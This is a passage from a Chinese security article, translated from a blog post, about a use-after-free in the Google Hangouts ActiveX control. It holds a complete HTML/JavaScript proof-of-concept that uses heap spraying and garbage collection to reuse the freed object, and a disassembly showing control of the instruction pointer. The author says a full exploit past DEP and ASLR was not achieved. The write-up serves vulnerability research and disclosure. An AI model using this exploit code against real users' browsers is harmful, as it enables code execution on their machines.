有了这些信息，我们可以创建下面的概念验证代码，它将在我们选择的地址进行执行。

    
    
     <html>  
     <div id="seandiv">  
     <object  
       classid="clsid:39125640-8D80-11DC-A2FE-C5C455D89593" id=sdr  
     >  
     </object>  
     </div>  
     <div id="corelanspraydiv"></div>  
     <script>  
     var largechunk = unescape("%u2030%u2228");  
     var spray = new Array();  
     function dospray()  
     {  
          while (largechunk.length < 0x10000) largechunk += largechunk;  
          for (var i = 0; i < 0x200; i++)  
          {  
               spray[i] = largechunk.substring(0,(0x50-6)/2);  
          }  
     }  
     function corelan_deps_spray()  
     {  
          var div_container = document.getElementById("corelanspraydiv");  
          div_container.style.cssText = "display:none";  
          junk = unescape("%u615d%u6161");  
          while (junk.length < 0x80000) junk += junk;  
          for (var i = 0; i < 0x500; i++)  
          {  
               var obj = document.createElement("button");  
               obj.title = junk;  
               div_container.appendChild(obj);  
          }  
     }  
     function sdrcallback(){  
          //alert("callback function is called!"); //use this to attach debugger and bu googletalkax!DllUnregisterServer+0x6385   
          this.document.getElementById("seandiv").innerHTML = "";  
          CollectGarbage();  
          CollectGarbage();  
          CollectGarbage();  
          //spray the heap with 0x50 size objects, this will overwrite the freed chunk  
          dospray();  
          //interact with the object  
          var ver = sdr.version;  
          sdr.send("sean");  
     }  
     //prime the lfh heap  
     dospray();  
     //spray reliable so location at 0x20302228 holds our data  
     corelan_deps_spray();  
     //invoke callback function  
     sdr.onmessage = sdrcallback;  
     </script>  
     <body>  
     </body>  
     </html>

这个代码将做一个DEPS堆喷射，将内存0x20302228的值设置成0x61616161。

然后，“onmessage”中的代码将释放对象，并用相同大小（0x50字节）的对象来喷射堆。旧指针现在将指向我们分配的内存，其中包含指向0x20302228地址的指针。当访问失效指针时，将执行以下ASM代码。

    
    
     13e70ca5 8b471c     mov   eax,dword ptr [edi+1Ch]  
     13e70ca8 8b30      mov   esi,dword ptr [eax] 
     13e70caa 8d850cffffff  lea   eax,[ebp-0F4h]  
     13e70cb0 50       push  eax  
     13e70cb1 8d45e4     lea   eax,[ebp-1Ch]  
     13e70cb4 50       push  eax  
     13e70cb5 e8768e0000   call  googletalkax!DllUnregisterServer+0xf210 (13e79b30)  
     13e70cba 8b4f1c     mov   ecx,dword ptr [edi+1Ch]  
     13e70cbd 83c408     add   esp,8  
     13e70cc0 50       push  eax  
     13e70cc1 ff5604     call  dword ptr [esi+4]

Edi +
1c保存的旧指针，现在替换为我们的0x20302228指针，这被加载到eax,然后将0x20302228里的值放入ESI寄存器。值是0x6161615d，它是由DEPS喷射的。然后程序调用ESI
+ 4，这是一个用户提供的地址0x61616161，这证明可以执行代码。

  

**进一步利用**

下一步是将其变成一个可以完整利用的漏洞。因为DEP和ASLR，我们需要使用这个bug来创建infoleak。我花了一些时间来研究，参考

<https://media.blackhat.com/bh-us-12/Briefings/Serna/BH_US_12_Serna_Leak_Era_Slides.pdf>
，但我没有找到进一步利用的方法。如果您有任何想法，请与我联系讨论他们。我会非常感兴趣，把这个bug变成infoleak。

本文翻译自pwnanisec.blogspot.be [原文链接](http://pwnanisec.blogspot.be/2017/02/use-after-free-in-google-hangouts.html)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **胖胖秦** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/85423](/post/id/85423)

安全客 - 有思想的安全新媒体

本文转载自: [pwnanisec.blogspot.be](http://pwnanisec.blogspot.be/2017/02/use-after-free-in-google-hangouts.html)

如若转载,请注明出处： <http://pwnanisec.blogspot.be/2017/02/use-after-free-in-google-hangouts.html>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p2.ssl.qhmsg.com/dm/200_200_100/t0130c8844942b1f889.jpg) 胖胖秦

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

